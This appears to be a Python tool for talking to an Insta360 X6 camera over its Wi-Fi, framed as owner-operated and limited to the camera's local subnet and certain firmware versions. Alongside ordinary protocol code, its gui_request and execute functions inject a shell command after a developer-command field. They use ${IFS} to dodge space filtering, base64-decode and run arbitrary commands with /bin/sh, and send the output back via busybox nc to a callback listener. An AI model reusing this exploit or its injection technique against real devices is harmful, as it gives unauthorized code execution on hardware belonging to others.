#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
# X6 camera adaptation; see NOTICE.txt.
"""Owner-operated X6 camera transport. Python standard library only.
No firmware, keys, SDK files, activation changes or installed service included.
"""
import base64
import ipaddress
import re
import secrets
import select
import socket
import struct
import time

CAMERA = '192.168.42.1'
READER_VERSIONS = ('0.8.825', '0.8.827')
MAX_FRAME = 1024 * 1024


def crc(data):
    value = 0xffffffff
    for byte in data:
        value ^= byte
        for _ in range(32):
            value = ((value << 1) ^ (0x04c11db7 if value & 0x80000000 else 0)) & 0xffffffff
    return value


def frame(kind, body, sequence):
    data = struct.pack('<4sBBBBI', b'UCD2', 1, 12, kind, sequence, len(body)) + body
    return data + struct.pack('<I', crc(data))


def frames(buffer):
    result = []
    while len(buffer) >= 12:
        if buffer[:5] != b'UCD2\x01':
            raise ValueError('Unexpected camera protocol')
        head = buffer[5]
        size = struct.unpack_from('<I', buffer, 8)[0]
        if not 12 <= head <= 64 or size > MAX_FRAME:
            raise ValueError('Invalid frame length')
        total = head + size + 4
        if len(buffer) < total:
            break
        part, buffer = buffer[:total], buffer[total:]
        if crc(part[:-4]) != struct.unpack_from('<I', part, total - 4)[0]:
            raise ValueError('Frame checksum mismatch')
        result.append((part[6], part[head:-4]))
    return result, buffer


def varint(value):
    out = bytearray()
    while value >= 128:
        out.append((value & 127) | 128)
        value >>= 7
    out.append(value)
    return bytes(out)


def fields(data):
    """Small, bounded protobuf wire reader; no vendor-generated descriptors."""
    result, i = {}, 0
    def integer():
        nonlocal i
        value = 0
        for shift in range(0, 70, 7):
            if i >= len(data):
                raise ValueError('Short protobuf value')
            byte = data[i]; i += 1
            if shift == 63 and byte > 1:
                raise ValueError('Oversize protobuf value')
            value |= (byte & 127) << shift
            if byte < 128:
                return value
        raise ValueError('Oversize protobuf value')
    while i < len(data):
        tag = integer(); number, kind = tag >> 3, tag & 7
        if number == 0:
            raise ValueError('Invalid protobuf tag')
        if kind == 0:
            value = integer()
        elif kind in (1, 2, 5):
            size = integer() if kind == 2 else (8 if kind == 1 else 4)
            if size > len(data) - i:
                raise ValueError('Short protobuf field')
            value = data[i:i + size]; i += size
        else:
            raise ValueError('Unsupported protobuf wire type')
        result.setdefault(number, []).append(value)
    return result


def one(data, number, default=None):
    values = data.get(number, [default])
    if len(values) != 1:
        raise ValueError('Duplicate required field')
    return values[0]


class Session:
    def __init__(self):
        self.sock = socket.create_connection((CAMERA, 6666), 4)
        self.buffer = b''; self.sequence = self.mid = 0
        self.heartbeat = time.monotonic()
        try:
            self.host = self.sock.getsockname()[0]
            if ipaddress.ip_address(self.host) not in ipaddress.ip_network('192.168.42.0/24') or self.host == CAMERA:
                raise RuntimeError('Connect this computer directly to the camera Wi-Fi')
            self.query(0xf0)
            self.query(0xf1, b'\x08\x01')
        except Exception:
            self.close(); raise

    def close(self):
        self.sock.close()

    def send(self, kind, body=b''):
        self.sequence = self.sequence % 255 + 1
        self.sock.sendall(frame(kind, body, self.sequence))

    def tick(self, timeout=.05):
        if time.monotonic() - self.heartbeat >= 3:
            self.send(5); self.heartbeat = time.monotonic()
        self.sock.settimeout(timeout)
        try:
            data = self.sock.recv(65536)
        except socket.timeout:
            return []
        if not data:
            raise EOFError('Camera connection closed')
        self.buffer += data
        if len(self.buffer) > MAX_FRAME + 68:
            raise ValueError('Receive budget exceeded')
        result, self.buffer = frames(self.buffer)
        return result

    def query(self, method, body=b''):
        self.mid += 1
        self.send(4, struct.pack('<HBIH', method, 2, self.mid | 0x80000000, 0) + body)
        deadline = time.monotonic() + 6
        while time.monotonic() < deadline:
            for kind, data in self.tick(.5):
                if kind == 4 and len(data) >= 9:
                    code, content, mid, _ = struct.unpack_from('<HBIH', data)
                    if mid & 0x3fffffff == self.mid:
                        if code != 200 or content != 2:
                            raise RuntimeError(f'Camera rejected query ({code}, {content})')
                        return data[9:]
        raise TimeoutError('Camera query timed out')

    def identity(self, versions=READER_VERSIONS):
        outer = fields(self.query(8, b'\x0a\x03\x0f\x1e\x30'))
        value = one(outer, 2)
        if not isinstance(value, bytes):
            raise ValueError('Camera identity absent')
        options = fields(value)
        values = [one(options, n, b'') for n in (15, 30, 48)]
        if not all(isinstance(v, bytes) for v in values):
            raise ValueError('Invalid camera identity')
        serial, version, model = (v.decode('ascii') for v in values)
        numeric_version = version[1:] if version[:1] in ('v', 'V') else version
        if not serial or numeric_version not in versions or model not in ('Insta360 X6', 'X6'):
            raise RuntimeError('Unsupported camera or firmware version / 相机机型或版本不受支持')
        return serial, version

    def authorized(self, client):
        body = b'\x0a' + varint(len(client)) + client.encode('ascii') + b'\x10\x01'
        reply = self.query(39, body)
        if not reply:
            raise RuntimeError('Empty authorization response is not proof of authorization')
        parsed = fields(reply)
        value = one(parsed, 1)
        if value is None:  # proto3 enum zero may be omitted, but require a known field
            identifier = one(parsed, 4)
            if not isinstance(identifier, bytes) or not identifier:
                raise ValueError('Invalid authorization response')
            value = 0
        if not isinstance(value, int):
            raise ValueError('Invalid authorization response')
        return value == 0


def gui_request(command, host, port):
    ip = ipaddress.ip_address(host)
    if ip not in ipaddress.ip_network('192.168.42.0/24') or str(ip) == CAMERA:
        raise ValueError('Invalid callback address')
    if not 1024 <= port <= 65535:
        raise ValueError('Invalid callback port')
    encoded = base64.b64encode(command.encode()).decode()
    shell = f'echo${{IFS}}{encoded}|/bin/busybox${{IFS}}base64${{IFS}}-d|/bin/sh|/bin/busybox${{IFS}}nc${{IFS}}-w${{IFS}}3${{IFS}}{ip}${{IFS}}{port}'
    request = ('DeveloperExecuteCommand_Action {"DeveloperExecuteCommand":%s} ' + shell + '\n').encode()
    if len(request) >= 1000:
        raise ValueError('Command too long; shorten it')
    return request


def completed_command(command, marker):
    # The subshell lets an explicit exit in the command still produce a result.
    return f'(\n{command}\n); x6_status=$?; printf "\\n{marker}:%s\\n" "$x6_status"'


def completed_output(output, marker):
    match = re.search(rb'\n' + re.escape(marker.encode('ascii')) + rb':([0-9]{1,3})\n\Z', output)
    if match is None or int(match[1]) > 255:
        raise RuntimeError('Missing or invalid command completion marker')
    result = output[:match.start()]
    if len(result) > 65536:
        raise RuntimeError('Output limit exceeded')
    status = int(match[1])
    if status:
        raise RuntimeError(f'Command exited with status {status}')
    return result


def execute(session, command):
    """Bounded stdout capture with completion/exit status; no remote cancellation."""
    marker = 'X6_DONE_' + secrets.token_hex(12)
    with socket.socket() as listener:
        listener.bind((session.host, 0)); listener.listen(1); listener.setblocking(False)
        request = gui_request(completed_command(command, marker), session.host, listener.getsockname()[1])
        with socket.create_connection((CAMERA, 23456), 3) as control:
            control.sendall(request)
            control.setblocking(False)
            incoming = None; out = bytearray(); end = time.monotonic() + 20; control_open = True
            try:
                while time.monotonic() < end:
                    watch = ([control] if control_open else []) + [incoming if incoming else listener]
                    ready, _, _ = select.select(watch, [], [], .1)
                    if control in ready:
                        if not control.recv(4096):
                            control_open = False  # stdout may arrive on the separate callback
                    if incoming is None and listener in ready:
                        incoming, peer = listener.accept()
                        if peer[0] != CAMERA:
                            raise RuntimeError('Unexpected callback source')
                        incoming.setblocking(False)
                    if incoming is not None and incoming in ready:
                        data = incoming.recv(4096)
                        if not data:
                            return completed_output(bytes(out), marker)
                        out.extend(data)
                        if len(out) > 65536 + 128:  # allow only bounded completion overhead
                            raise RuntimeError('Output limit exceeded')
                    session.tick(.01)
                raise TimeoutError('No complete command result; check camera Wi-Fi and local firewall')
            finally:
                if incoming is not None:
                    incoming.close()


